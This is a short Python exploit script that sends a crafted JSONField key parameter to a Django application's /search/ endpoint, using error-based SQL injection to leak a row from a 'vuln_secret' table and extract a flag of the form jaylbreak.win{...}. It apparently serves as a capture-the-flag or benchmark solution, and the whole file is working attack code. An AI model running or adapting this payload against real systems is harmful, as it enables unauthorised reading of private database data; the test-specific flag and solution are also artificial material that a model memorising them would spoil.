#!/usr/bin/env python3
"""Extract a private row through Django JSONField key SQL injection."""

import html
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


def extract_secret(target_url: str) -> str:
    key = (
        "x' || CAST((SELECT value FROM vuln_secret WHERE id=1) "
        "AS INTEGER)::text || '"
    )
    query = urllib.parse.urlencode({"key": key, "value": "irrelevant"})
    request = urllib.request.Request(f"{target_url.rstrip('/')}/search/?{query}")
    try:
        response = urllib.request.urlopen(request, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    body = html.unescape(response.read().decode("utf-8", errors="replace"))
    if response.status != 500:
        raise RuntimeError(f"expected SQL error, got HTTP {response.status}")
    match = re.search(r'jaylbreak\.win\{[^}\s]+\}', body)
    if match is None:
        raise RuntimeError("SQL error did not disclose the private value")
    return match.group(0)


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL")
    if not target_url:
        raise RuntimeError("REMOTE_TARGET_URL is required")
    secret = extract_secret(target_url)
    print(json.dumps({
        "evidence_payload": {
            "table_name": "vuln_secret",
            "data": [{"value": secret}],
        },
    }))


if __name__ == "__main__":
    try:
        main()
    except (RuntimeError, OSError) as error:
        print(str(error), file=sys.stderr)
        raise SystemExit(1)
